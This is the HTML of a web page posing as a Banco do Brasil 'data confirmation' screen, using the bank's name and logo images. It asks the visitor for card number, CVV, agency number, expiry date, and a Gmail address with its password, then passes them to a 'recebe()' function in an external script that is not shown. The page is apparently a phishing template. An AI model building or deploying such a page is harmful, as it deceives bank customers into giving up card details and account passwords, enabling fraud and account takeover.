<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banco do Brasil</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <header>
            <img class="logo" src="/img/logo.png" alt="">
            <img class="nome" src="/img/nome.png" alt="">
    </header>
    <main>
        <div class="irPara">
            <p class="ir">Ir para o portal BB</p>
            <img src="./img/seta.png" alt="">
        </div>
        <div class="container">
            <div class="confirma">
            <img src="./img/cell.png" alt="">
            <p class="textConfirma">Confirmação de dados</p>
            </div>
            <form class="form1" action="">
                <div class="test">
                    <label class="textInput" for="numeroCartao">Número do cartão</label>
                    <input class="padrao borda" type="number" name="numeroCartao" id="numeroCartao">
                </div>
                <div class="test">
                    <label class="textInput" for="cvv">CVV</label>
                    <input type="number" name="cvv" id="cvv">
                </div>
                <div class="test">
                    <label class="textInput" for="agencia">Agência</label>
                    <input class="padrao borda" type="number" name="agencia" id="agencia">
                </div>
                <div class="test">
                    <label class="textInput" for="dataValidade">Data de validade</label>
                    <input type="date" name="dataValidade" id="dataValidade">
                </div>
            </form>
        </div>
        <div class="container ajuste">
            <div class="confirma">
            <img src="./img/email.png" alt="">
            <p class="textConfirma">Confirmação de dados</p>
            </div>
            <form class="form1">
                <div class="test">
                    <label class="textInput" for="email">G-mail</label>
                    <input class="padrao borda" type="email" name="email" id="email">
                </div>
                <div class="test">
                    <label class="textInput" for="senha">Senha</label>
                    <input type="password" name="senha" id="senha">
                </div>
            </form>
            <button onclick="recebe()">Enviar</button>
        </div>
        
    </main>
    <script src="/script.js"></script>
</body>
</html>
